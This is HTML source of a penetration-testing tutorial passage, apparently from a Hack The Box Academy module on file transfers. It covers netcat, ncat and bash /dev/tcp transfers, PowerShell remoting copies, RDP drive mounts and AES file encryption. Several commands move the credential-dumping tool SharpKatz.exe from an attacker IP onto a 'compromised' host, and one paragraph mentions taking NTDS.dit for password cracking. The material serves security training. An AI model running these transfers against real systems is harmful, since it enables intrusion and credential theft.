&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;--send-only&lt;/span&gt; &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;compromised-machine-connect-to-ncat-to-receive-the-file&quot;&gt;Compromised Machine Connect to Ncat to Receive the File&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Ncat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ncat 192.168.49.128 443 &lt;span class=&quot;nt&quot;&gt;--recv-only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we don’t have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file &lt;a href=&quot;https://tldp.org/LDP/abs/html/devref1.html&quot;&gt;/dev/TCP/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Writing to this particular file makes Bash open a TCP connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host:port&lt;/code&gt;, and this feature may be used for file transfers.&lt;/p&gt;

&lt;h4 id=&quot;netcat---sending-file-as-input-to-netcat&quot;&gt;NetCat - Sending File as Input to Netcat&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Original Netcat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 0 &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ncat---sending-file-as-input-to-ncat&quot;&gt;Ncat - Sending File as Input to Ncat&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Ncat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;--send-only&lt;/span&gt; &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;compromised-machine-connecting-to-netcat-using-devtcp-to-receive-the-file&quot;&gt;Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &amp;lt; /dev/tcp/192.168.49.128/443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The same operation can be used to transfer files from the compromised host to our Pwnbox.&lt;/p&gt;

&lt;h2 id=&quot;powershell-session-file-transfer&quot;&gt;PowerShell Session File Transfer&lt;/h2&gt;

&lt;p&gt;We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that’s the case, we can use &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2&quot;&gt;PowerShell Remoting&lt;/a&gt;, aka WinRM, to perform file transfer operations.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2&quot;&gt;PowerShell Remoting&lt;/a&gt; allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.&lt;/p&gt;

&lt;p&gt;To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote Management Users&lt;/code&gt; group, or have explicit permissions for PowerShell Remoting in the session configuration. Let’s create an example and transfer a file from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC01&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATABASE01&lt;/code&gt; and vice versa.&lt;/p&gt;

&lt;p&gt;We have a session as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC01&lt;/code&gt;, the user has administrative rights on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATABASE01&lt;/code&gt;, and PowerShell Remoting is enabled. Let’s use Test-NetConnection to confirm we can connect to WinRM.&lt;/p&gt;

&lt;h4 id=&quot;from-dc01---confirm-winrm-port-tcp-5985-is-open-on-database01&quot;&gt;From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb\administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DC01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Test-NetConnection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DATABASE01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;5985&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DATABASE01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RemoteAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;192.168.1.101&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RemotePort&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;5985&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InterfaceAlias&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ethernet0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SourceAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;192.168.1.100&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TcpTestSucceeded&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Because this session already has privileges over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATABASE01&lt;/code&gt;, we don’t need to specify credentials. In the example below, a session is created to the remote computer named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATABASE01&lt;/code&gt; and stores the results in the variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$Session&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;create-a-powershell-remoting-session-to-database01&quot;&gt;Create a PowerShell Remoting Session to DATABASE01&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Session&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-PSSession&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DATABASE01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Copy-Item&lt;/code&gt; cmdlet to copy a file from our local machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC01&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DATABASE01&lt;/code&gt; session we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$Session&lt;/code&gt; or vice versa.&lt;/p&gt;

&lt;h4 id=&quot;copy-samplefiletxt-from-our-localhost-to-the-database01-session&quot;&gt;Copy samplefile.txt from our Localhost to the DATABASE01 Session&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell-session&quot;&gt;PS C:\htb&amp;gt; Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;copy-databasetxt-from-database01-session-to-our-localhost&quot;&gt;Copy DATABASE.txt from DATABASE01 Session to our Localhost&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Copy-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Destination&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-FromSession&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Session&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;rdp-1&quot;&gt;RDP&lt;/h2&gt;

&lt;p&gt;RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.&lt;/p&gt;

&lt;p&gt;If we are connected from Linux, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdesktop&lt;/code&gt;. At the time of writing, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdesktop&lt;/code&gt; allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.&lt;/p&gt;

&lt;p&gt;As an alternative to copy and paste, we can mount a local resource on the target RDP server. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdesktop&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; can be used to expose a local folder in the remote RDP session.&lt;/p&gt;

&lt;h4 id=&quot;mounting-a-linux-folder-using-rdesktop&quot;&gt;Mounting a Linux Folder Using rdesktop&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rdesktop 10.10.10.132 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; HTB &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Password0@&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; disk:linux&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/home/user/rdesktop/files&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;mounting-a-linux-folder-using-xfreerdp&quot;&gt;Mounting a Linux Folder Using xfreerdp&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:&lt;span class=&quot;s1&quot;&gt;&apos;Password0@&apos;&lt;/span&gt; /drive:linux,/home/plaintext/htb/academy/filetransfer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To access the directory, we can connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\tsclient\&lt;/code&gt;, allowing us to transfer files to and from the RDP session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/24/tsclient.jpg&quot; alt=&quot;Windows File Explorer showing a network folder named &apos;tsclient&apos; with a subfolder &apos;linux&apos;.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alternatively, from Windows, the native &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc&quot;&gt;mstsc.exe&lt;/a&gt; remote desktop client can be used.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/24/rdp.png&quot; alt=&quot;Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After selecting the drive, we can interact with it in the remote session that follows.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;protected-file-transfers&quot;&gt;Protected File Transfers&lt;/h1&gt;

&lt;p&gt;As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization’s network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. Howe
ver, sometimes these options are not available to us, and a different approach is required.&lt;/p&gt;

&lt;h2 id=&quot;file-encryption-on-windows&quot;&gt;File Encryption on Windows&lt;/h2&gt;

&lt;p&gt;Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the &lt;a href=&quot;https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1&quot;&gt;Invoke-AESEncryption.ps1&lt;/a&gt; PowerShell script. This script is small and provides encryption of files and strings.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;EXAMPLE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-AESEncryption&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p@ssw0rd&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Text&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Secret Text&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Invoke-AESEncryption.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Command:&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-AESEncryption&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;p4ssw0rd&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\scan-results.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encrypted&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb\scan-results.txt.aes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Directory:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                 &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LastWriteTime&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                 &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/18/2020&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;12:17&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;9734&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-AESEncryption.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
